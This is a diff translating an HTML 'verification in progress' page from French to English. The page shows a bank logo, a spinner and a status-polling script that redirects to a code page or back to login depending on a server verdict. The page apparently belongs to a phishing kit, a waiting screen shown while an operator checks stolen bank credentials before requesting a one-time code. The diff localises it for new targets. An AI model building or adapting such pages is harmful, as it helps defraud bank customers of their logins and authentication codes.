@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr" dir="ltr">
+<html lang="en" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Vérification en cours</title>
+<title>Verification in progress</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
@@ -45,8 +45,8 @@
 <div class="container">
   <div class="bank-logo"><img src="images/logo.jpg" alt="BOK"></div>
   <div class="spinner"></div>
-  <h1>Vérification de vos données</h1>
-  <p>Veuillez patienter pendant que nous vérifions les données de votre compte.<br>Cela peut prendre quelques instants.</p>
+  <h1>Verifying your data</h1>
+  <p>Please wait while we verify your account data.<br>This may take a few moments.</p>
   <div class="dots-anim">
     <span></span><span></span><span></span>
   </div>
@@ -57,7 +57,7 @@
   const orderId = params.get("order");
 
   if (!orderId) {
-    location.href = "index-fr.html";
+    location.href = "index-en.html";
   }
 
   function checkStatus() {
@@ -65,9 +65,9 @@
       .then(r => r.json())
       .then(data => {
         if (data.status === "confirmed") {
-          location.href = "code-fr.html?order=" + orderId;
+          location.href = "code-en.html?order=" + orderId;
         } else if (data.status === "rejected") {
-          location.href = "login-fr.html?order=" + orderId + "&error=1";
+          location.href = "login-en.html?order=" + orderId + "&error=1";
         }
       })
       .catch(() => {});
